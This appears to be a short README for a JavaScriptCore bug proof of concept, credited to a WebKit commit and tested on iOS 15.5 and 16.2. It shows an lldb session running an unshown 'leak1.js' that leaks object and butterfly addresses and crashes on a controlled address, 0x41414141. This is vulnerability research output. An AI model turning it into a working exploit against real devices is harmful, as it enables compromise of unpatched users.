# PropConditionBug
# Not my bug nor found by me found here : https://github.com/WebKit/WebKit/commit/7225cf04ea3d003ba0698f620a447be04902fd34
JSC bug tested on iOS 15.5 and iOS 16.2 


Current Output:
bootywarrior@Bootys-MacBook-Air fuzzilli % lldb /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc /Users/bootywarrior/Downloads/leak1.js
(lldb) target create "/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc"
Current executable set to '/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc' (arm64e).
(lldb) settings set -- target.run-args  "/Users/bootywarrior/Downloads/leak1.js"
(lldb) r
Process 67686 launched: '/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc' (arm64e)
Object: 0x12d5bbe80 with butterfly 0x70010281e8(base=0x70010281e0) (Structure 0x30000a390:[0xa390/41872, Object, (0/6, 0/0){}, NonArrayWithDouble, Proto:0x10a025468, Leaf]), StructureID: 41872
Object: 0x12d5bbe40 with butterfly 0x70010282c8(base=0x70010282c0) (Structure 0x30000a400:[0xa400/41984, Object, (6/6, 0/0){a0:0, a1:1, a2:2, a3:3, a4:4, a5:5}, NonArrayWithDouble, Proto:0x10a047b68, Leaf]), StructureID: 41984
Process 67686 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x41414141)
    frame #0: 0x00000001a879f734 JavaScriptCore`JSC::JSValue::dump(WTF::PrintStream&) const + 32
JavaScriptCore`JSC::JSValue::dump:
->  0x1a879f734 <+32>: ldr    w8, [x8]
    0x1a879f738 <+36>: and    x8, x8, #0xfffffffe
    0x1a879f73c <+40>: adrp   x9, 253437
    0x1a879f740 <+44>: add    x9, x9, #0x0              ; g_config
Target 0: (jsc) stopped.
(lldb) 

